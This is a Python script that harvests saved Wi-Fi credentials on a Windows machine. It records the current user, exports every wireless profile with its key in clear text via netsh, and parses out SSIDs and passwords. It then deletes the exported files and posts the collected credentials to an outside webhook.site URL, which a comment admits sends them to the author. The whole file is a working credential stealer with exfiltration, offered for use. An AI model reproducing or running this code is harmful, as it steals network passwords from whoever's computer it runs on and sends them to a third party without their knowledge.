import os
import requests
import subprocess
import xml.etree.ElementTree as ET

url = "https://webhook.site/b6bd9496-acf9-4a0b-8423-88e43b2ba755"  # replace with your url if you don't want to share your credentials with me
final_payload = ''
who_am_i = subprocess.run("whoami", capture_output=True, shell=True).stdout.decode()
final_payload += f'from: {who_am_i}\n'

command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"],
                         capture_output=True, shell=True).stdout.decode()
path = os.getcwd()

for f_name in os.listdir(path):
    if f_name.endswith('.xml'):
        f_name = f'{path}/{f_name}'
        tree = ET.parse(f_name)
        root = tree.getroot()
        try:
            print(f'SSID: {root[0].text}, Pass: {root[4][0][1][2].text}')
            final_payload += f'SSID: {root[0].text}, Pass: {root[4][0][1][2].text}\n'
        except IndexError as e:
            print(f'{e} for SSID: {root[0].text}')
            final_payload += f'{e} for SSID: {root[0].text}\n'
        os.remove(f_name)
        try:
            os.remove(f'{path}/Wi-Fi-')
        except FileNotFoundError:
            pass

try:
    requests.post(url, data=final_payload.encode())
except Exception as e:
    print(e)
